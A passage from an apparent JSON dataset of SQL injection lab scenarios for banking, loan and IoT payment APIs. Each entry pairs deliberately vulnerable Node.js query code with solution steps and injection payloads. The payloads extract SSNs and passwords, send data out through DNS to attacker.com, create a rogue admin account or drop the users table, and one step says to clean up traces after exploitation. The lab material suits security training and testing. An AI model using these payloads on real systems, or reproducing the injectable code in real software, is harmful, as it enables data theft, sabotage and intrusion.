    "srcCode": "app.post('/update-profile', (req, res) => {\n  const { username } = req.body;\n  db.query(`UPDATE users SET username = '${username}' WHERE id = 1`, (err) => {\n    if (err) res.status(500).send('Profile update failed: ' + err.message);\n    else res.send('Profile updated');\n  });\n});",
    "payloads": [
      "'",
      "' OR 1=1 --",
      "' UNION SELECT 1,table_name FROM information_schema.tables --",
      "'|| (SELECT 1/0) --"
    ]
  },
  {
    "Lab scenario": "Bank Internal Admin Panel - UNION SQL Injection via Department Filter",
    "Lab Description": "A hidden admin panel for managing bank employees accepts a 'department' filter that is vulnerable to UNION-based SQL Injection. Attackers can retrieve sensitive employee payroll data by injecting UNION payloads through the filter. To solve: leak and extract payroll records.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Discover the hidden 'department' parameter using Burp Intruder.",
      "Inject UNION-based payloads to test column count and types.",
      "Extract sensitive salary, employee ID, and SSN records.",
      "Automate extraction using sqlmap with UNION mode.",
      "Access restricted employee salary reports using leaked data."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.get('/admin/employees', (req, res) => {\n  const { department } = req.query;\n  db.query(`SELECT * FROM employees WHERE department = '${department}'`, (err, employees) => {\n    if (err) res.status(500).send('Fetch failed');\n    else res.json(employees);\n  });\n});",
    "payloads": [
      "' UNION SELECT id, name, ssn, salary FROM employees -- ",
      "' UNION ALL SELECT NULL, username, password, NULL FROM users --"
    ]
  },
  {
    "Lab scenario": "Mobile Banking App API - Blind SQL Injection in Balance Inquiry",
    "Lab Description": "The API endpoint '/api/balance' accepts an 'account_id' parameter that is not properly sanitized, leading to Boolean-Blind SQL Injection. Attackers can infer account balances and usernames by triggering true/false conditions. To solve: enumerate the database content using boolean-based inference.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Repeater to modify 'account_id' requests.",
      "Inject crafted payloads and monitor responses.",
      "Use TRUE/FALSE conditions like 'OR 1=1' and 'OR 1=2'.",
      "Slowly extract database entries through logical inference.",
      "Automate with sqlmap '--technique=B' option if needed."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.get('/api/balance', (req, res) => {\n  const { account_id } = req.query;\n  db.query(`SELECT balance FROM accounts WHERE id = '${account_id}'`, (err, result) => {\n    if (err) res.status(500).send('Error');\n    else res.json(result);\n  });\n});",
    "payloads": [
      "' OR 1=1 --",
      "' AND 1=2 --",
      "' OR (SELECT CASE WHEN (SUBSTR((SELECT username FROM users LIMIT 1),1,1)='a') THEN 1 ELSE 0 END) --"
    ]
  },
  {
    "Lab scenario": "Banking Loan Application Portal - Error-Based SQL Injection in Application ID",
    "Lab Description": "Loan applications are retrievable using an 'application_id' parameter without input validation, exposing error-based SQL Injection. Attackers can force SQL errors that leak backend table names and column data. To solve: retrieve full loan applications and customer credit scores.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Capture traffic to '/loan/view' endpoint.",
      "Inject invalid inputs causing SQL syntax errors.",
      "Analyze database error messages for information leaks.",
      "Craft error-based UNION payloads to retrieve credit scores.",
      "Access confidential loan approval data."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.get('/loan/view', (req, res) => {\n  const { application_id } = req.query;\n  db.query(`SELECT * FROM loan_applications WHERE id = '${application_id}'`, (err, data) => {\n    if (err) res.status(500).send('Error: ' + err.message);\n    else res.json(data);\n  });\n});",
    "payloads": [
      "' UNION SELECT null,table_name FROM information_schema.tables --",
      "' OR 1=1 --",
      "'||(SELECT 1/0)||'"
    ]
  },
  {
    "Lab scenario": "IoT Payment Reader API - OOB SQL Injection on Device Registration",
    "Lab Description": "IoT payment readers register to the API by providing 'device_serial' numbers. Improper validation causes Out-of-Band SQL Injection, allowing attackers to exfiltrate data via external DNS servers. To solve: perform successful DNS exfiltration via crafted SQL payloads.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Collaborator to set up a payload receiver.",
      "Intercept device registration requests and modify 'device_serial'.",
      "Inject payloads triggering DNS callbacks via database functions.",
      "Capture database name, version, or user info through external requests.",
      "Report the stolen device authentication tokens."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.post('/iot/register', (req, res) => {\n  const { device_serial } = req.body;\n  db.query(`INSERT INTO devices (serial) VALUES ('${device_serial}')`, (err) => {\n    if (err) res.status(500).send('Device Registration Error');\n    else res.send('Device Registered');\n  });\n});",
    "payloads": [
      "'; exec master..xp_dirtree '//attacker.com/abc' --",
      "'; SELECT LOAD_FILE('\\\\attacker.com\\data') --"
    ]
  },
  {
    "Lab scenario": "Bank Admin Portal - Stacked Query SQL Injection in Batch Payment Processing",
    "Lab Description": "The batch payment upload feature concatenates unvalidated fields directly into SQL queries. Stacked queries allow attackers to inject malicious statements, leading to privilege escalation or backdoor creation. To solve: inject stacked queries to create a rogue admin account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept a batch upload request using Burp Suite.",
      "Craft payloads ending the legitimate query and starting a new one.",
      "Insert SQL commands to create a new admin account.",
      "Access the admin dashboard using the injected credentials.",
      "Cleanup traces after exploitation."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.post('/batch-upload', (req, res) => {\n  const { batch_name } = req.body;\n  db.query(`INSERT INTO batches (name) VALUES ('${batch_name}')`, (err) => {\n    if (err) res.status(500).send('Batch upload failed');\n    else res.send('Batch processed');\n  });\n});",
    "payloads": [
      "batch1'; INSERT INTO users (username, password, role) VALUES ('eviladmin', 'password123', 'admin') --",
      "batch2'; DROP TABLE users --"
    ]
  }
]